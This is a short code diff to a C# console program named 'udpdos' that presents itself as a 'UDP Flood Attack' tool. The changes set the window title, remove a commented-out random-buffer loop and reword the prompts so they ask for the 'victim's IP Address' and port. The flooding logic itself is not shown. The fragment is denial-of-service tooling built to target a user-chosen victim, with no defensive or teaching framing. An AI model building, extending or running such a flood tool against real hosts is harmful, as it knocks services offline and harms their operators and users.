@@ -17,15 +17,12 @@ public class udpdos
 
     public static void Main(string[] args)
     {
-        /*for (int i = 0; i < sendbuf.Length; i++)
-        {
-            sendbuf[i] = Convert.ToByte(rnd.NextInt64(100));
-        }*/
+        Console.Title = "UDP Flood Attack";
 
-        Console.WriteLine("Enter in the ip address you would like to attack. ");
+        Console.WriteLine("Welcome to the UDP Flood Attack. \n Please enter the victim's IP Address: ");
         ipaddr = Console.ReadLine();
 
-        Console.WriteLine("Enter in the port:");
+        Console.WriteLine("Enter in the victim's port:");
         port = int.Parse(Console.ReadLine());
 
 
